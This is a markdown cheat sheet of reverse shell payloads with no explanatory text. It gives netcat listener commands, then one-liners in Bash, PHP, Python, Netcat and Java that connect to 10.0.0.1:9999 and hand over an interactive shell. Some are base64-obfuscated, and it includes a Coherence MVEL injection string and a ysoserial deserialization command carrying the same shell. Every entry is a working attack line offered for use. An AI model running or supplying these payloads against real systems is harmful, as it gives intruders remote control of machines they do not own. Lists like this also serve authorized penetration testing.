# Various Reverse Shells
# Shell Listener
```
nc -lvp 9999
```
###
or
###
```
nc -A -l 9999
```
###

# Bash
```
bash -i >& /dev/tcp/10.0.0.1/9999 0>&1
```
###
###
```
echo "bash -i >& /dev/tcp/10.0.0.1/9999 0>&1" | bash
```
###
#### Base64 Encoded
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
```
###

# PHP
```
php -r '$sock=fsockopen("10.0.0.1",9999);exec("bash -i <&3 >&3 2>&3");'
```
###
###
```
<?php 

$cmd = 'echo "bash -i >& /dev/tcp/10.0.0.1/9999 0>&1" | bash';
exec($cmd);

?>
```
###

# Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

```
###
###
```
import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);

s.connect(("10.0.0.1",9999));

os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

p=subprocess.call(["/bin/bash","-i"]);

```
###

# Netcat
```
nc -e /bin/sh 10.0.0.1 9999
```
###
###
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 9999 >/tmp/f
```
###

# Java
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","bash -i >& /dev/tcp/10.0.0.1/9999 0>&1"] as String[])
p.waitFor()
```
###
###
```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}
```
###
###
```
com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(new%20String%20[]{"bash","-c","{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"});')
```
###
#### Base64 Encoded Payload for Deserialization
```
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'
```
###
